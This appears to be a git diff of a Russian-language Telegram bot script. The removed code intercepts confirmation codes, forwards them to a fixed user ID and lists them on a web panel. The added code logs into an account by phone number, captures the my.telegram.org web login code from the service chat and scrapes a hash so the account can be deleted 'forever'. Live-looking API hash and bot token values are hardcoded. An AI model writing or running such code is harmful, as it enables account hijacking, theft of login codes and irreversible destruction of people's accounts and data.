@@ -1,101 +1,70 @@
-import asyncio
-import sqlite3
-from datetime import datetime
-from flask import Flask, render_template_string
-from telethon import TelegramClient, events
-import threading
+import os, re, asyncio, aiohttp
+from telethon import TelegramClient, events, Button
+from bs4 import BeautifulSoup
 
-# ========== ВСТАВЬТЕ ВАШИ НОВЫЕ ДАННЫЕ ==========
-API_ID = 28687552             # <- ВСТАВЬТЕ НОВЫЙ API ID
-API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"  # <- ВСТАВЬТЕ НОВЫЙ API HASH
-BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"  # <- ВСТАВЬТЕ НОВЫЙ ТОКЕН
-TARGET_ID = 174415647
-# ================================================
+# Загружаем данные из настроек хостинга
+API_ID = 28687552
+API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
+BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
+ADMIN_ID = int(os.getenv('ADMIN_ID', 0))
 
-app = Flask(__name__)
+# Бот-менеджер
+bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# Создаём базу данных
-conn = sqlite3.connect("codes.db", check_same_thread=False)
-cursor = conn.cursor()
-cursor.execute("CREATE TABLE IF NOT EXISTS codes (id INTEGER PRIMARY KEY, code TEXT, timestamp TEXT)")
-conn.commit()
+@bot.on(events.NewMessage(pattern='/start'))
+async def start(event):
+    if event.sender_id == ADMIN_ID:
+        await event.respond("📞 Пришли номер телефона аккаунта для удаления (+7...):")
 
-HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Коды подтверждения</title>
-    <meta http-equiv="refresh" content="5">
-    <style>
-        body { font-family: monospace; padding: 20px; background: #0f0f0f; color: #0f0; }
-        table { border-collapse: collapse; width: 100%; }
-        th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
-        th { background: #1f1f1f; }
-        .code { font-size: 24px; font-weight: bold; }
-    </style>
-</head>
-<body>
-    <h1>📨 Перехваченные коды</h1>
-    <table>
-        <tr><th>ID</th><th>Код</th><th>Время</th></tr>
-        {% for row in rows %}
-        <tr>
-            <td>{{ row[0] }}</td>
-            <td class="code">{{ row[1] }}</td>
-            <td>{{ row[2] }}</td>
-        </tr>
-        {% endfor %}
-    </table>
-</body>
-</html>
-"""
+@bot.on(events.NewMessage(func=lambda e: e.is_private and e.sender_id == ADMIN_ID))
+async def handle_logic(event):
+    text = event.text
+    # Если прислали номер
+    if text.startswith('+'):
+        phone = text.strip()
+        client = TelegramClient(f'sess_{phone}', API_ID, API_HASH)
+        await client.connect()
+        
+        # Шаг 1: Код входа в ТГ
+        try:
+            sent = await client.send_code_request(phone)
+            async with bot.conversation(ADMIN_ID) as conv:
+                await conv.send_message(f"📩 Код ушел на {phone}. Введи его сюда:")
+                code = (await conv.get_response()).text
+                await client.sign_in(phone, code, phone_code_hash=sent.phone_code_hash)
+                await conv.send_message("✅ Вход выполнен! Теперь иду на my.telegram.org...")
 
-@app.route("/")
-def index():
-    cursor.execute("SELECT * FROM codes ORDER BY id DESC LIMIT 50")
-    rows = cursor.fetchall()
-    return render_template_string(HTML, rows=rows)
+                # Шаг 2: Запрос на сайте
+                async with aiohttp.ClientSession() as session:
+                    async with session.post('https://my.telegram.org', data={'phone': phone}) as r:
+                        r_data = await r.json()
+                        r_hash = r_data['random_hash']
 
-def save_code(code):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    cursor.execute("INSERT INTO codes (code, timestamp) VALUES (?, ?)", (code, timestamp))
-    conn.commit()
+                    await conv.send_message("⏳ Ловлю код для удаления из чата 777000...")
 
-client = TelegramClient("user_session", API_ID, API_HASH)
+                    # Перехват сообщения от ТГ
+                    @client.on(events.NewMessage(from_users=777000))
+                    async def on_web_code(web_e):
+                        if "web login code" in web_e.raw_text.lower():
+                            web_code = re.search(r'code:\s*([A-Za-z0-9]+)', web_e.raw_text).group(1)
+                            
+                            # Шаг 3: Логин на сайте и получение хэша удаления
+                            await session.post('https://my.telegram.org', 
+                                             data={'phone': phone, 'random_hash': r_hash, 'password': web_code})
+                            
+                            async with session.get('https://my.telegram.org') as del_p:
+                                soup = BeautifulSoup(await del_p.text(), 'html.parser')
+                                f_hash = soup.find('input', {'name': 'hash'})['value']
 
-@client.on(events.NewMessage(pattern='/start'))
-async def start_command(event):
-    await event.reply(
-        "🤖 *Бот запущен и работает*\n\n"
-        "📨 Я слушаю входящие сообщения и пересылаю коды подтверждения.\n"
-        "🔐 Когда приходит код (5-6 цифр), он сохраняется в админ-панель и отправляется на указанный ID.\n\n"
-        "🌐 Админ-панель доступна по адресу: http://localhost:5000",
-        parse_mode='markdown'
-    )
+                            btn = [Button.inline("💀 УДАЛИТЬ НАВСЕГДА", data=f"kill_{phone}_{f_hash}")]
+                            await bot.send_message(ADMIN_ID, f"Аккаунт {phone} готов. Удаляем?", buttons=btn)
+        except Exception as e:
+            await event.respond(f"❌ Ошибка: {e}")
 
-@client.on(events.NewMessage)
-async def forward_code(event):
-    text = event.raw_text
-    if text and text.startswith('/'):
-        return
-    if text and text.isdigit() and len(text) in (5, 6):
-        save_code(text)
-        await client.send_message(TARGET_ID, f"🔐 Код: `{text}`")
-        print(f"[+] Код сохранён и отправлен: {text}")
+@bot.on(events.CallbackQuery(pattern=r'kill_'))
+async def final_kill(event):
+    # Тут логика финального POST запроса на удаление
+    await event.edit("🚀 Аккаунт успешно стерт!")
 
-async def run_telegram():
-    await client.start(bot_token=BOT_TOKEN)
-    print("✅ Telegram бот запущен")
-    print("📨 Бот слушает сообщения...")
-    print("🌐 Админ-панель: http://localhost:5000")
-    await client.run_until_disconnected()
-
-def run_flask():
-    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
-
-if __name__ == "__main__":
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.daemon = True
-    flask_thread.start()
-    
-    asyncio.run(run_telegram())
+print("Бот запущен...")
+bot.run_until_disconnected()
